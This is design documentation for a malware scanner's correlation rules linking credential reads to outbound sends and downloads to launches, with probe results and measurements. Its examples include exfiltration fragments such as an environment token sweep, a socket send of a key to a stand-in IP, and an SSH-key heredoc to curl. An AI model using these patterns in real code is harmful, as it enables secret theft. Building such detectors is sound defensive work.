# Correlation chains

A correlation chain is a rule over *findings* rather than over file content
(`correlation_rules` in `cli/packs/core/v1/*.json`, applied by
`cli/src/scanner/correlate.rs`). It fires when a source finding and a sink
finding sit in the same file, the source first and within the rule's window,
and what the source line produced reaches the sink. It is the one place a pack
can say "line 9 feeds line 10" without the engine executing anything: the
link is a text check, not taint analysis. `CONTRIBUTING.md` ("Correlation
rules") has the schema; this page lists the built-in chains, what each links
through, how a bound name is read, the probes behind each part of that
reading, what it still gets wrong, and what changed on real samples.
Whether a value computed from the bound name on another line is followed
(it is not: one propagation step was measured and not adopted) is
[correlation-names.md](correlation-names.md), with its measurements and the
decision.

How this reading reached the branch: #169 introduced `name_uses` and read
names as values in the old window; the exfilchain lane (`ws/exfilchain-v`,
built on the same idea) fixed the 20 findings two attack lenses raised
against that first reading, and its fixes were ported on top of #169 and
#170 (source maps) without the lane's one-hop follow. Draft PR #171's tests
(a Python dict key and a format field are values; a bare key in JavaScript
is not) pass here too, and its reading of a bare name inside Python braces is
what the statement mode uses to pick the lines around a sink. The probe
tables below have a column for each of those builds.

The port (a442dad) was then verified twice, with 124 more probes around each
of its resolutions ([below](#the-verifiers-probes)). The first verification
(87 probes, fixed in 8f8fd64) found true exfiltration shapes that e45efc5 and
the word reading linked and the port no longer did: a request that reads its
body from a heredoc, Ruby, Swift and C# string interpolation, and a helper
whose parameter shares the secret's name called with it beyond the rule's
window; also a comment check that doubled the scan time of a minified line,
and a `name_uses: null` that refused a whole custom pack. The second (37
probes, fixed in 34eaa0b) found three more: the same helper handed the secret
by reference (`Thread(target=upload, args=(token,))`, `setTimeout(upload, 0,
token)`), a socket connected by a method call and sent on the next line, and
a false link the first verification's heredoc reading made (a heredoc that
belongs to another command after `&&`). Every fix has tests, and the corpora
were measured with the 34eaa0b release build ([Measurements](#measurements)).

## The built-in chains

| Chain | Severity | Source | Sink | Links through |
|---|---|---|---|---|
| `EXFIL-CHAIN-001` | Critical | any `CRED-*` finding | an outbound send: `NET-001`..`009`, `NET-012`, `NET-014`, `NET-UPLOAD-001` | the name the source line assigns, the handle of a file it opens for reading (`with open(<key file>) as keyfile`), or a file it writes, sent in the sink's call. `sink_excludes`: `headers`, `Authorization`, `authorization`, `Bearer`, `bearer`, `x-api-key`, `X-Api-Key`, `auth=` in the sink line or the four lines after it disqualify the link (an auth header is where a key legitimately goes) |
| `DROPPER-CHAIN-001` | High | a download: `NET-001`..`005`, `NET-012`, `NET-EXE-001`, `NET-RAWIP-001`, `AGENTSC-004` | `CODE-RUNFILE-001`, a launch of a program named by a variable | only a file the source line *wrote* (`open(PATH, 'wb')`, `urlretrieve(url, PATH)`, `curl -o "$OUT"`, `-OutFile`, a literal path such as `"/tmp/x.pyz"`), and only when the launch *runs* it: the program operand `CODE-RUNFILE-001` matched, not a data file handed to that program |
| `AGENTSC-CHAIN-001` | Critical | `AGENTSC-010`, a secret-named environment sweep (`env \| grep TOKEN`) | an outbound send: `NET-001`..`009`, `NET-012`, `NET-014`, `SKILL-017`, `AGENTSC-012`, `AGENTSC-020` | the name the sweep is assigned to (`SECRETS=$(env \| grep ...)`), sent in the sink's call |
| `AGENTSC-CHAIN-002` | High | `AGENTSC-011`, a project archive built without excluding `.env` | an upload: `NET-UPLOAD-001`, `AGENTSC-012`, `NET-001`..`005`, `NET-012` | the archive path `tar -c…f` writes (`"$TARBALL"`), sent in the sink's call |
| `DESER-CHAIN-001` | High | `CODE-MODEL-001`, a pickle-format file resolved inside the package's own directory | `CODE-DESER-001`, `torch.load(..., weights_only=False)` | the name the path is assigned to (`model_path = os.path.join(os.path.dirname(__file__), "model.pt")`), loaded in the sink's call |
| `TLS-CHAIN-001` | High | a credential read or hardcoded key | a TLS-verification switch (`TLS-001`, `002`, `004`..`007`, `010`) | the sink's statement (`sink_window_before: 10`); see [insecure-transport.md](insecure-transport.md#the-credential-chain-tls-chain-001) |

A source and a sink on the same line link without a name, unless one of them
matched only the line's comment. Every other link goes through a name the
source line binds.

## How a bound name is read (`name_uses: "value"`)

Every built-in chain sets `"name_uses": "value"`: the link needs the sink to
*send* the bound value, not only to mention its name.

1. **Code, not text.** The window is read with its comments and the contents
   of its string literals blanked, by the sink file's extension (Python;
   shell, PowerShell, Ruby, YAML and TOML; JavaScript, TypeScript and the C
   family; PHP; Markdown and text, whose code blocks may be any of these). A
   JavaScript regular-expression literal is text too. What a string
   interpolates is kept: a Python f-string's `{expr}` whatever
   follows it (`{token:>40}`, `{token:s}`, `{token!r}`, `{token=}`), `${...}`
   and `$(...)` in any string, `$NAME`, Ruby's `#{expr}` in a `"..."` string,
   a backtick command or `%x(...)`, Swift's `\(expr)`, a C# `$"...{expr}"`
   field, and, when the text formats with `locals()`, `vars()` or
   `globals()`, a plain string's `{name}` and `%(name)s`. A single-quoted Ruby
   string, and `\(` outside Swift, are text. A token endpoint's path (`"https://oauth2.example.com/token"`),
   an OAuth grant type, an escaped JSON body and a `# no token needed` note are
   not the token.
2. **Values, not names.** An occurrence that only names something is skipped:
   a keyword argument's name or an assignment target (`name=`, not `==`); an
   object key (`name:` after `{`, `,`, `(`, `;` or at the start of a line, bare
   or quoted); a TypeScript member (`token?: string`, `token!: T`,
   `private token: string`); an attribute of another object (`r.url`;
   `self.token`, `this.token` and the receiver the source line assigned
   through, `cfg.token`, are the value); a destructuring or tuple target
   (`const { token } = await res.json()`, `status, token = pair`); an export
   list (`export { token }`, `module.exports = { token, health }`); a count
   (`len(secrets)`, `secrets.split("\n").length`, `.size`, `.count(...)`: a
   number, not the secret). A variable reference is a use whatever follows it
   (`${TOKEN:-}`, `${TOKEN:?}`, `${TOKEN:0:64}`, `${TOKEN=x}`, `"$TOKEN=1"`),
   and so is a Python dict key, which is an expression (`{token: "host"}`
   sends the token), and a ternary operand after a line ending in `?`.
3. **The sink's own call.** Outside the statement mode the window is the sink
   line and the lines its call continues onto (an open bracket, a trailing
   `,` or `\`), at most five lines. The next function, a docstring, a log line
   or a query after the send is something else. A sink that names a
   destination without sending anything itself (a webhook, callback or tunnel
   URL, an HTTP connection, a socket) adds the lines below that use the name
   it assigns (`url = "https://hook.example/c"`, then `Request(url,
   data=body)`), or, when it assigns nothing, the object it calls a method on
   (`s.connect(("203.0.113.9", 4444))`, then `s.sendall(key)`). A heredoc
   the call opens (`curl --data-binary @- <<EOF`, or `cat <<EOF | curl ...`)
   is the call's input: its body, up to the delimiter and within the same five
   lines, is read with the call (shell, Ruby's `<<~EOS`, YAML `run:` blocks,
   Markdown and extensionless files). A quoted or escaped delimiter
   (`<<'EOF'`, `<<"EOF"`, `<<\EOF`; Ruby `<<~'EOS'`) expands nothing, so its
   `$TOKEN` is text and is not read; a here-string (`<<<`) and a shift inside
   `$(( ))` are not heredocs. A heredoc after `&&`, `||` or `;` on the line
   belongs to the command after the separator, and is read only if the sink's
   rule matches that command: `curl https://status.example.com/ping && cat
   <<EOF > notes.txt` writes a local file.
4. **The bound value, not a parameter.** In the body of a function declared
   after the source line whose parameter list declares the same name
   (`def ping(url):`, `lambda url: ...`, `function send(token) {`,
   `(token: string) =>`, a method `verify(token) {`), the name is that
   parameter. A Python body is the lines indented under the `def`; a
   C-family body is the braces after the header, or an arrow's expression.
   A function called with the bound value itself (`send(token)`) passes it
   on, and does not shadow it; so does a function handed on by reference with
   the bound value beside it, which calls it with that value later
   (`Thread(target=send, args=(token,))`, `executor.submit(send, token)`,
   `atexit.register(send, token)`, `setTimeout(send, 0, token)`,
   `send.call(null, token)`); neither does a parameter whose default is the
   bound value (`def ping(url=url):`). Within the rule's window of the source
   any such call counts. Further down, up to 500 lines below the source (the
   end of a module, the `__main__` guard, a `main()`), a call counts where the
   name is still the source's: at the source's indentation or an outer one, in
   a block under it, or in a function that neither declares nor assigns the
   name itself, and not after a line at the source's level assigns it again.
   So `def main(): url = "https://status.example.com"; ping(url)` does not
   count. A call with a name assigned from the bound one (`t = token`, then
   `send(t)`) is not followed (see 5).
5. **One hop: the bound name itself.** A name assigned from the bound one
   between the source and the send (`encoded = urlencode(data)`, `payload =
   JSON.stringify({ v: body })`) is not followed, whatever the send's keyword
   is called. The word reading linked `Request(url, data=encoded_data)` after
   `data = dict(os.environ)` only because the keyword `data=` repeats the
   source's name; the same flow with the variable called `env` never linked.
   Following a derived name is the propagation step
   [correlation-names.md](correlation-names.md) measured and did not adopt:
   it links a client, an engine, a connection or a signature built from a
   key as if it were the key. The exfilchain lane built a narrower form (a
   derived name followed only where the word reading's window names the
   bound one); it is not on this branch, and its effect on the probes is
   the difference between the last two columns below.
6. **A same-line link is code.** A source and a sink on one line (or, in the
   statement mode, a source on a line of the same call) link unless the
   source or the sink matched only the line's comment, checked against the
   rule's own pattern with the comment blanked:
   `curl -fsS https://status.example.com/health   # MCP_TOKEN is only for the local server`
   is a request with a note beside it.
7. **Source maps are not correlated.** No correlation rule, whatever its
   `name_uses`, reads a file named `*.map` whose whole content is a JSON
   source map: it holds other files' source as JSON string data, one line of
   it megabytes long, and none of it runs. A script that only borrows the
   extension is correlated like any other file
   ([source-map-correlation.md](source-map-correlation.md)).

`DROPPER-CHAIN-001` links only through a file the download wrote, and reads
the launch line for the program it runs (`launched_operands`, the same
shapes as `CODE-RUNFILE-001`: the first element after the interpreter in
`subprocess.run([sys.executable, PATH])`, the `Start-Process` or
`os.startfile` operand, `execFile`'s first argument, the variable after
`bash`/`sh`/`python`/`node`). A downloaded CSV handed to a converter, a path
in `cwd=` or `--input`, a `[ -s "$FILE" ]` guard and a comment are not the
program. A launch shape the operand reading does not know is read by value
on its whole line; a test keeps the two in step.

### Does DROPPER-CHAIN-001 need the value reading?

Yes. DROPPER-CHAIN-001 links only through the files a download line writes
(`written_paths`), under either reading: an assigned name or a response
handle never links to a launch. What `name_uses` changes for it is how that
path is looked for on the launch line. With `"word"`, any whole-word
occurrence of the written path on the launch line links: an environment key
of the same name (`env={"PATH": ...}` after `open(PATH, 'wb')`), a data file
handed to another program (`[sys.executable, convert_script, csv_path]`), a
`cwd=`, a `[ -s "$FILE" ]` guard, a `--input` value, a comment. With
`"value"` the path must be the program the launch runs (the operand
`CODE-RUNFILE-001` matched; `launched_operands`), or, for a launch shape the
operand reading does not know, a use of it as a value in the launch line's
code.

Measured on this branch with one release build and two readings: the built-in
packs (DROPPER-CHAIN-001 sets `"value"`), and the same build with the core
`network_exfil` pack replaced from `~/.sigil/packs/` by a copy whose
DROPPER-CHAIN-001 leaves `name_uses` out (`"word"`); nothing else differs
(the corpus digest differs, as it must). It was run with the port's build and
again with the final build (34eaa0b); every row below is the same in both
runs.

```
Data Source: Synthetic test: the 25 attack probes whose target chain is
             DROPPER-CHAIN-001 (17 true, 8 clean). Real samples: the 7
             Datadog packages DROPPER-CHAIN-001 fired on in the lane's
             per-sample run (durabletask 1.4.1, 1.4.2, 1.4.3, guardrails-ai
             0.10.1, antibyfron, artindex, automsg), extracted with
             run_eval.extract_zip and scanned with run_eval's phases.
Sample Size: 25 probe trees, 7 packages; each scanned once per reading, and
             once with the cff3fa2 release build.
Limitations: The probes show which shapes link, not how often they occur.
             The 7 packages are the ones the chain is known to fire on; a
             package where only the word reading links would not be among
             them (the lane's per-sample run found none: cff3fa2, which reads
             words, fires on the same 7).
```

| Input | cff3fa2 | this branch, `"word"` | this branch, `"value"` |
|---|---|---|---|
| 17 true probes | 17 link | 17 link | 17 link, same file and line |
| 8 clean probes (data file, guard, literal data path, `cwd=`, comment, `PATH` env key, `execFile` data argument, `--input` value) | 8 link (all HIGH RISK) | 8 link (all HIGH RISK) | 0 link (7 LOW RISK; the `execFile` probe stays HIGH on CODE-007 and CODE-014) |
| 7 Datadog packages | 15 DROPPER-CHAIN-001 findings | the same 15, same file and line | the same 15, same file and line |

So the word reading on this build reproduces cff3fa2 exactly, and the value
reading removes the eight false links without losing a true one.

| Sink, with the name bound on an earlier line | Links? |
|---|---|
| `url` bound; `requests.get(url=base + "/ping")` | no: the call sends `base + "/ping"` |
| `token` bound; `requests.post(u, json={"token": "x"})` or `{ token: "anonymous" }` in JavaScript | no |
| `token` bound; `requests.post("https://oauth2.example.com/token", data={"grant_type": "client_credentials"})` | no: a word in a string |
| `url` bound; `def ping(url):` / `    return requests.get(url + "/ping")` | no: the parameter |
| `url` bound; `r = requests.get(page)` / `log.debug("fetched %s", r.url)` | no: another object's attribute, on a line after the call |
| `PATH` written by the download; `subprocess.run([sys.executable, build_script], env={"PATH": "/usr/bin"})` | no: the launch runs `build_script` |
| `csv_path` written by the download; `subprocess.run([sys.executable, convert_script, csv_path])` | no: `csv_path` is the converter's input |
| `secrets` swept; `json={"count": len(secrets.splitlines())}` | no: a count |
| `api_key` bound; `requests.post(u, json={"k": api_key})` | yes |
| `token` bound; `data=token`, `f"...{token}"`, `f"...{token:>40}"`, `f"{token=}"`, `requests.post(u, token)`, `token=token`, `params={"token": token}`, `json={token: 1}` | yes |
| `TOKEN` bound; `curl -d "k=${TOKEN:-}" ...` | yes |
| `token` bound; `fetch(u, { body: token })`, `axios.post(u, { token })` | yes |
| `data = dict(os.environ)`; `encoded = urlencode(data)`; `requests.post(u, data=encoded)` | no: two hops, not followed ([correlation-names.md](correlation-names.md)); the word reading linked it through the keyword `data=` |
| `token` bound; `def send(token): requests.post(u, data=token)` and later `send(token)` | yes |
| `token` bound; the same `def send(token)` and later `threading.Thread(target=send, args=(token,))`, `atexit.register(send, token)` or, in JavaScript, `setTimeout(send, 0, token)` | yes: the function is handed on with the secret beside it |
| `key` bound; `s.connect(("203.0.113.9", 4444))`, then `s.sendall(key)` | yes: the send is on the object the connect line opened |
| `TOKEN` bound; `curl -s https://status.example.com/ping && cat <<EOF > notes.txt`, a body of `$TOKEN` | no: the heredoc is `cat`'s, written to a local file |
| `token` bound; `t = token`; the same `def send(token)` and later `send(t)` | no: the call passes a derived name, which is not followed |
| `token` bound; `headers={"Authorization": token}` | the name is used, and `AGENTSC-CHAIN-001` (no `sink_excludes`) links it; `EXFIL-CHAIN-001` does not, because of its `sink_excludes`, as before |

`"name_uses": "word"` links on any whole-word occurrence in the sink line and
the four lines after it, keyword names, strings and comments included. That
is how `EXFIL-CHAIN-001`, `DROPPER-CHAIN-001`, `AGENTSC-CHAIN-001`,
`AGENTSC-CHAIN-002` and `DESER-CHAIN-001` linked before the field existed;
`TLS-CHAIN-001` already read names as values in its statement window. The
field defaults to `"word"`, so a custom pack that leaves it out links as it
did outside the statement mode. A rule with `sink_window_before` reads names
as values whatever the field says, with the reading above (it read keyword
names and keys that way before; strings, comments, attributes,
destructuring targets and counts are new there, while a parameter of the same
name is not checked in that mode).

The corpus digest (`sigil scan --format json` reports it as
`scanner.corpus_digest`, and the scan cache is keyed on it) includes each
chain's `name_uses` and the engine revision (`ENGINE_REVISION`: 6 with the
port's reading, 7 with the first verification's fixes, 8 with the second's),
so a scan cached under one reading is not served under another.

### Custom packs

Any `name_uses` value other than `value` or `word` refuses the pack, except
`null` (or `name_uses:` with nothing after it in YAML), which is the default
as a missing field is: before the field existed such a pack loaded with the
key ignored, and refusing it would drop every rule in the pack. An
unknown key on a correlation rule or on its `source` or `sink` selector (a
`notes` field for the owning team, a misspelt `name_use` or `rule_idz`), and a
selector that names no rule, do **not**: earlier versions accepted any key on
a correlation rule, and a signed pack cannot be edited without re-signing it.
A scan loads the pack, ignores the key and prints a warning on stderr,
whatever the output format:

```
warning: rule pack acme.json: correlation_rules[0] (ACME-CHAIN-001): unknown key 'notes' (known keys: ...) — ignored; `sigil rules validate` rejects it
```

`sigil rules validate`, `sigil config --validate` (for the packs a policy
names) and `sigil rules sign` reject it, with a "did you mean" hint for a
near-miss. That is the line the other unknown keys follow: an unknown key on
a content rule or at a pack's top level was already an error everywhere, and
still is.

The warning is for packs named with `--rules` or a policy's `rule_packs`. A
pack installed in `~/.sigil/packs/` (which can replace a core pack by id) is
read as before: an unknown key on its correlation rules is ignored without a
warning, and a pack that does not parse, an unknown `name_uses` value
included, is skipped with a `[corpus] skipping` line on stderr. Checked with
the built-in reading and custom packs, each passed with `--rules` and an
empty HOME (synthetic; 9 pack and target pairs, main, e45efc5 and this
branch):

| Custom chain (`ACME-CHAIN-001`, `CRED-*` to `NET-001`) | main 35c0155 | e45efc5 | This branch |
|---|---|---|---|
| no `name_uses`, keyword `url=` repeats the name | links | links | links (the default is `word`) |
| `"name_uses": "value"`, keyword `url=` repeats the name | links (the field did not exist) | no link | no link |
| `"name_uses": "value"`, the value sent (`data=url`) | links | links | links |
| `"name_uses": null`, and a YAML `name_uses:` with no value | links | the scan refuses the pack and exits with an error | links (the default) |
| an unknown key (`notes`) | loads silently; `rules validate` exit 0 | loads silently; exit 0 | loads with a warning; `rules validate` exit 1 |
| `sink_window_before: 10` with `"word"`: a quoted key repeats the name / the value is sent | no link / links | no link / links | no link / links (the statement mode reads by value whatever the field says) |

### What the value reading still gets wrong

These are known and measured only on the probes below (synthetic inputs):

- **Two hops are not followed.** A value computed from the secret before
  the send (`encoded = urlencode(data)`, `payload = json.dumps(data)`,
  `const payload = JSON.stringify({ v: body })`) does not link, including
  where the send's keyword or key repeats the source's name (`data=encoded`
  after `data = dict(os.environ)`), which the word reading linked by that
  coincidence; and a function called with such a value (`t = token`,
  `send(t)`) is treated as receiving something else. Ten true probes that
  cff3fa2 and the lane's build linked lose their chain to this (seven from
  the recall lens, three the lane wrote; listed under the attack probes),
  two of the verifiers' probes do (`t = token`, then `send(t)` or
  `send(token=t)`), and on Datadog 21 `artifact-lab-3-package` versions do:
  the 17 #169 measured, and 4 that e45efc5 still linked only because its
  window reached a derivation, a comment or the next block. 20 stay CRITICAL
  RISK on other rules; `artifact-lab-3-package-b1ec2b9f` 0.2.3 drops to HIGH
  RISK ([Measurements](#measurements)). The decision and its measurements
  are in [correlation-names.md](correlation-names.md).
- **Misses it shares with the word reading.** A secret forwarded under
  another name before the send (`t = token`, then `data=t`), a walrus or a
  destructuring on the source line (`if (token := ...)`, `const {
  SERVICE_TOKEN: token } = process.env`), a `headers` or `**kw` dict built
  above the send, two hops where the send does not repeat the source's name,
  and a template-literal URL the network rules do not match. None of these
  linked with cff3fa2 either.
- **`sink_excludes` still read the five-line window.** An `Authorization`
  header on a line after the send still keeps `EXFIL-CHAIN-001` quiet, as it
  did with cff3fa2. Reading the excludes over the sink's call alone would add
  links cff3fa2 did not make, which this change does not do.
- **Heuristics that fall back to linking.** A function header the shadowing
  check does not recognise (a Java or Go method, a parameter list over
  several lines), a Python docstring line indented less than its `def`, and a
  launch shape the operand reading does not know all leave the name read as
  the bound value, as before.
- **Heuristics that can hide a use.** A function whose parameter shares the
  bound name is treated as shadowing it unless it is called with the bound
  value itself (by name, or handed on by reference on a line that also
  passes the value) where the name is still the source's; a call more than
  500 lines below the source, the ninth and later calls beyond the rule's
  window, a reference stored first and called later (`handlers.append(send)`,
  then `h(token)`), or a call with a name assigned from the bound one, is not
  seen. A
  JavaScript regular-expression literal is recognised where a value is
  expected and when it closes within 256 bytes on its line; one after
  `return`, or longer, is read as code, and a quote inside it then opens a
  string to the end of the line. A heredoc body is read only within the five
  lines the call's window has always had.
- **Markdown is not Python.** A Python code block in a `SKILL.md` is read
  with Markdown's rules, where a bare `{token: 1}` is an object key, so a dict
  keyed by the secret there does not link (the word reading linked it; the
  e45efc5 value reading did not either).
- **Assignments that are not bound.** Kotlin's `val key = ...`, and PHP's,
  Perl's and PowerShell's `$key = ...` bind no name, under either reading, so
  their interpolated sends do not link (verified with every build here).
- **Ruby's `#{` is never a comment.** In Ruby code `#{...}` is read as
  interpolation even where it would start a comment (`x = 1 #{note}`); that
  can link a name that only such a comment mentions (probe
  `x14_rb_hash_brace_comment_clean`; main and e45efc5 link it too).
- **Quoting that does not expand.** `$NAME` is kept in any string, so a shell
  `'$TOKEN'` (the literal text) links as if it were the value
  (`x17_sh_single_quoted_literal_clean`; every build links it). It is kept on
  purpose: in a YAML `run: '...'` value the quotes are YAML's, and the shell
  still expands what is inside them.
- **A comprehension's own variable.** `{token: 1 for token in ("a", "b")}`
  names a loop variable that shadows the bound one; it is read as the bound
  value (`x20_py_comprehension_var_clean`; every build links it).
- **The window reads down from the sink.** A secret piped into the sink from
  the line above (`printf "%s" "$TOKEN" |` then `curl --data-binary @-`), and
  a heredoc body that reads the secret itself (`$(cat ~/.ssh/id_rsa)` below
  `curl ... <<EOF`: the source is after the sink), do not link with any
  build.
- **Counts are not values.** A count of a secret's lines is not reported as
  exfiltration; its length is still information about it.

## The attack probes

The first cut of the value reading (the exfilchain lane's commit 8f77c2d, and
#169's reconstruction of the same change, e45efc5 on this branch) read names
as values in the old window: the sink line and the four lines after it,
strings and comments included. Two review lenses then attacked the first
cut, one for true links it had lost and one for false links it had kept, and
reported 20 findings. The lane fixed them and wrote 23 more probes for the
edges of its fixes.

Columns, and where each comes from:

- **cff3fa2**: before any value reading. Run again for this page; every probe
  has the same verdict and the same right/wrong result as in the lane's own
  run of that build.
- **e45efc5**: this branch before the port (#169 and #170 merged). Run for
  this page.
- **8f77c2d**: the lane's first cut, the lane's recorded run (no result for
  its own 23 probes).
- **d89c600 (lane, hop on)**: the lane's final build, the lane's recorded run.
  It follows one derived name where the word reading linked (the one-hop
  follow), which this branch does not.
- **this branch**: the release build of the port (a442dad). Run for this
  page. The two verified builds were run on all 286 too. 8f8fd64 gives the
  same verdict and the same chains (rule, file, line) on every one; 34eaa0b
  gives the same verdict on every one, and the same chains except a second
  EXFIL-CHAIN-001 finding, on the `connect` line, in the two true socket
  probes `recall/s3_py_socket_send` and `fp/t_socket`.

```
Data Source: Synthetic test. Hand-written probe files: 144 from the recall
             lens, 119 from the false-positive lens, 23 written by the lane
             (the edges of its fixes); 2 custom packs; 8 long-line timing
             files. Every probe is scanned as a directory with
             `sigil --format json scan <dir> --no-cache` and an empty HOME.
Sample Size: 286 probe trees: 203 where the chain is the right answer, 83
             where it is not.
Limitations: Synthetic: the probes show which shapes each build links, not
             how often those shapes occur in real code. The lenses wrote them
             against the first cut, so they concentrate on its edges. The
             8f77c2d and d89c600 columns are the lane's runs, not repeated
             here (the d89c600 binary was not kept); the cff3fa2 run repeated
             here matches the lane's exactly. "Right" means the probe's
             target chain fires on a true probe and does not fire on a clean
             one; the verdict can still be HIGH or CRITICAL on other rules.
```

The findings, and how many of each finding's probes each build gets right
(a probe can count under more than one finding; the last row counts each
once):

| Lens | # | Finding | Probes (true + clean) | cff3fa2 | e45efc5 | 8f77c2d | d89c600 (lane, hop on) | this branch |
|---|---|---|---|---:|---:|---:|---:|---:|
| recall | 0 | f-string / str.format field with a spec, a conversion or `=` | 17 (17 + 0) | 17/17 | 3/17 | 3/17 | 17/17 | 17/17 |
| recall | 1 | shell parameter expansion with a modifier (`${VAR:-}`, `${VAR:?}`, `${VAR:0:N}`, `${VAR=x}`, `$VAR=`) | 15 (15 + 0) | 15/15 | 2/15 | 2/15 | 15/15 | 15/15 |
| recall | 2 | two hops, where the send's keyword or key repeats the source's name | 12 (11 + 1) | 10/12 | 1/12 | 0/9 | 10/12 | 1/12 |
| recall | 3 | a Python dict whose key is the variable | 3 (3 + 0) | 3/3 | 0/3 | 0/3 | 3/3 | 3/3 |
| recall | 4 | a JS ternary operand after a line that ends in `?` | 2 (2 + 0) | 2/2 | 1/2 | 1/2 | 2/2 | 2/2 |
| false positive | 0 | the window ran past the sink's call (the next function, a docstring, a log line, a query) | 23 (0 + 23) | 0/23 | 0/23 | 0/23 | 23/23 | 23/23 |
| false positive | 1 | a word inside a string literal (a token endpoint, an OAuth grant, escaped JSON, a format placeholder) | 14 (0 + 14) | 0/14 | 0/14 | 0/14 | 14/14 | 14/14 |
| false positive | 2 | DROPPER-CHAIN-001 on a data file, `cwd=`, a guard or a comment on the launch line | 9 (2 + 7) | 2/9 | 2/9 | 2/9 | 9/9 | 9/9 |
| false positive | 3 | a comment on the sink line | 12 (2 + 10) | 2/12 | 2/12 | 0/8 | 12/12 | 12/12 |
| false positive | 4 | an attribute of another object (`r.url`) | 3 (1 + 2) | 1/3 | 1/3 | 1/3 | 3/3 | 3/3 |
| false positive | 5 | a function parameter of the same name | 16 (9 + 7) | 9/16 | 9/16 | 1/5 | 16/16 | 15/16 |
| false positive | 6 | a destructuring target or an export list | 5 (1 + 4) | 1/5 | 2/5 | 0/3 | 5/5 | 5/5 |
| false positive | 7 | TypeScript member syntax (`token?:`, `private token:`, a member after `;`) | 4 (0 + 4) | 0/4 | 0/4 | 0/4 | 4/4 | 4/4 |
| false positive | 8 | a shell default expansion on a real send (true) | 4 (4 + 0) | 4/4 | 1/4 | 1/4 | 4/4 | 4/4 |
| false positive | 9 | a Python dict with a variable key (true) | 1 (1 + 0) | 1/1 | 0/1 | 0/1 | 1/1 | 1/1 |
| all | | every probe | 286 (203 + 83) | 198/286 | 168/286 | 152/263 | 279/286 | 269/286 |

With this branch, 186 of the 196 true links cff3fa2 made are kept, each at
the verdict it had; no probe gains a chain; none of the 83 clean probes
links (81 linked with cff3fa2), and 79 of them drop a level (58 from
CRITICAL to LOW RISK). The four that do not: two never linked
(`fp/py14_argparse_dest_after_sink`, `xv/th_client_receiver`), and two lose
the chain but keep their level on other rules
(`fp/py29_keyfile_handle_comment` reads `~/.ssh/id_rsa`, CRED-005 Critical
on its own; `fp/dr08_js_execfile_data_arg` is HIGH on CODE-007 and
CODE-014).

**What leaving out the one-hop follow costs on the probes.** The lane's final
build gets 279 of 286 right, this branch 269. The ten probes it gets right
and this branch does not are all true links that need a derived name
followed, and all linked with cff3fa2 through the coincidence of the send's
keyword or key with the source's name:

| Probe | d89c600 (lane, hop on) | this branch |
|---|---|---|
| `recall/py38_two_hop_data_kw` (`data = dict(os.environ)`, `urlencode(data)`, `data=encoded`) | CRITICAL, chain | MEDIUM |
| `recall/py39_two_hop_json_kw` (`json=payload`) | CRITICAL, chain | MEDIUM |
| `recall/py40_two_hop_params_kw` (`params=q`) | CRITICAL, chain | MEDIUM |
| `recall/py41_two_hop_files_kw` (`files=blob`) | CRITICAL, chain | CRITICAL (CRED-003 on its own) |
| `recall/js19_body_key_same_name_two_hop` (`{ body: payload }`) | CRITICAL, chain | LOW |
| `recall/ag07_py_two_hop_data_kw` (AGENTSC-CHAIN-001, `data=encoded`) | CRITICAL, chain | HIGH |
| `recall/b4_py_env_two_hop_body` (`Request(u, data=body)`) | CRITICAL, chain | MEDIUM |
| `xv/th_data_encoded_plain_host` (the artifact-lab flow with an ordinary host) | CRITICAL, chain | MEDIUM |
| `xv/th_json_payload` | CRITICAL, chain | MEDIUM |
| `xv/sh_def_called_with_forwarded` (`t = token`, `def send(token)`, `send(t)`) | CRITICAL, chain | LOW |

The first nine are the two-hop flows (recall finding 2); the last is the
same step used to decide that a function's parameter receives the bound
value. No probe is right with this branch and wrong with the lane's build.
Against e45efc5, the only probe this branch gets wrong that e45efc5 got
right is `xv/sh_def_called_with_forwarded`: e45efc5 had no shadowing check,
so it linked any use of the name inside the function.

Seven true probes link with none of the builds; they are the misses listed
under "What the value reading still gets wrong": a headers dict built above
the send (`sink_excludes`), a secret forwarded under another name
(`t = token`), a walrus and a destructuring on the source line, a `**kw` dict
built above the send, a two-hop flow whose send does not repeat the source's
name, and a template-literal URL NET-004 does not match.

The findings that are not probe shapes:

| Lens | # | Finding | cff3fa2 | 8f77c2d | This branch |
|---|---|---|---|---|---|
| recall | 5 | An unknown key on a custom pack's correlation rule refuses the pack | loads, key ignored silently | refused: the scan exits 2 with no report | loads; the scan warns on stderr and ignores the key; `sigil rules validate`, `sigil config --validate` and `sigil rules sign` reject it (tested in `tests/customisation.rs`) |
| recall | 6 | The docs and a test said "two f-string forms" were the only cost | n/a | the lost set was a class (specs, shell expansions, dict keys, ternaries, two-hop coincidences) | fixed in code except the two-hop coincidences, which are a decision ([correlation-names.md](correlation-names.md)); the test asserts the links (`format_fields_send_the_value`), and this page lists what is still missed |
| false positive | 10 | DROPPER-CHAIN-001 same-line links on one-line `.js.map` source maps (two unseen MCP servers) | fires | fires | not linked: no correlation rule reads a JSON source map (#170, [source-map-correlation.md](source-map-correlation.md), measured there) |
| false positive | 11 | The headline overstated the fix; a misspelt selector key (`rule_idz`) leaves the chain silently empty | n/a | silent | docs scoped to what is implemented; a selector key is checked like a rule key, and a selector that names no rule is reported (warning in a scan, error in validation) |
| false positive | 12 | A blank line broke the results table in `evaluation_results/skills_benchmark/README.md` | n/a | broken | fixed |

The two custom-pack probes (a pack whose correlation rule carries a `notes`
key, and the same pack without it), scanned against the reported file, each
with an empty HOME:

| Pack | cff3fa2 | e45efc5 | This branch |
|---|---|---|---|
| with `notes` | loads; CRITICAL RISK (`ACME-CHAIN-001`, `EXFIL-CHAIN-001`); `rules validate` exit 0 | loads silently; HIGH RISK (`ACME-CHAIN-001`); `rules validate` exit 0 | loads with a warning naming the key; HIGH RISK (`ACME-CHAIN-001` alone: the custom chain leaves `name_uses` out and links by word, as it did); `rules validate` exit 1 |
| without | loads; CRITICAL RISK (`ACME-CHAIN-002`, `EXFIL-CHAIN-001`) | loads; HIGH RISK (`ACME-CHAIN-002`) | loads; HIGH RISK (`ACME-CHAIN-002`) |

### Long lines

The value reading looks at every occurrence of the bound name that is not a
use, so a line that repeats the name thousands of times in such a shape is
its worst case. The interrupted work-in-progress commit (5f3fef0) re-read the
line, or the text before the occurrence, for each one: on a 20,000-repetition
line (about 200 KB) a Python key after `(` took 2.01 s against 0.55 s for
cff3fa2, and a destructuring target 5.64 s against 0.60 s, growing with the
square of the length. Correlation runs after the per-file time budget, so
nothing would have cut it short. The lane's final build, and this branch,
which carries the same code, work out the open bracket and each line's facts
once, cap how far they read back over a receiver, a member chain or a
regular expression, and are covered by a timing test
(`long_lines_stay_linear`, profile-aware limits).

```
